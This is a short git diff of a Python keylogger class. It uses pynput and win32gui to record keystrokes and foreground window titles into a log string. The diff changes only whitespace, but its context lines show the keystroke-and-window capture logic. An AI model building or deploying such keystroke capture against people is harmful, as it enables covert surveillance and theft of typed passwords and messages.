@@ -4,6 +4,7 @@ from win32gui import GetWindowText, GetForegroundWindow
 
 KEY = pynput.keyboard.Key
 
+
 class keylogger:
     def __init__(self, log_clicks=False, escape_combo=(KEY.shift, KEY.f1)):
         self.key_log = ""
@@ -64,4 +65,3 @@ class keylogger:
         if not (self.window == current_window or current_window == ""):
             self.window = current_window
             self.key_log += "\n" + "-" * 5 + f"{self.window}" + "-" * 5 + "\n"
-
